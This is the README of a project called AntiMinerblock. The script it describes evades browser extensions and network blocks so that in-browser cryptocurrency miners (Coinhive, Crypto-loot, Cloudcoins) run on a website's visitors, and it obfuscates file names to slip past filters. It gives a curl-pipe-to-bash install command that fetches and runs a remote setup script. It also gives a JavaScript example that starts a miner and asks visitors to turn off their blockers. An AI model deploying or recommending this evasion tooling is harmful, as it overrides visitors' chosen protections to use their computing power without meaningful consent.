# AntiMinerblock
This script attempts to bypass extensions or network blocks that prevent the use of online cryptocurrency miners.

## Features
* Obfuscates filenames per server
* Attempts to use Coinhive, Crypto-loot, and Cloudcoins, in that order.

## Installation
### Ubuntu/Unix
Navigate to your server's scripts directory and run
```bash
bash <(curl -s https://raw.githubusercontent.com/SkyrisBactera/AntiMinerblock/master/setup.sh)
```
Then, add the script tag that the file generates to every HTML file you want to be protected. That's it!
### Windows
Not implemented yet (you can use cygwin for now)

## Usage
Call loadCryptominer, which will return a miner, and will return a value 0 to 4 referring to whether or not it worked.
```
0 - Coinhive
1 - Crypto-loot
2 - Cloudcoins
3 - All blocked
4 - Script not blocked, but failure creating miner instance
```

Example:
```javascript
loadCryptominer(function(miner, status) {
  //Code that mines
  //For example:
  if (status == 3 || status == 4) {
  	document.write("Please disable your adblock or minerblock")
  }
  miner.start();
});
```
## Donate!
If you appreciate this project, feel free to send me some Monero at:
```424kUkn7pU7SVF4qmbzVt6fLPRFw6Q1v7RmVq4qE9sE2V5dyhZoGdWHDUFui85SfhVTfmDN3CzcYDQSwo41z3AuLDzU3qQt```

or just use PayPal:
```davis@skyrisbactera.com```
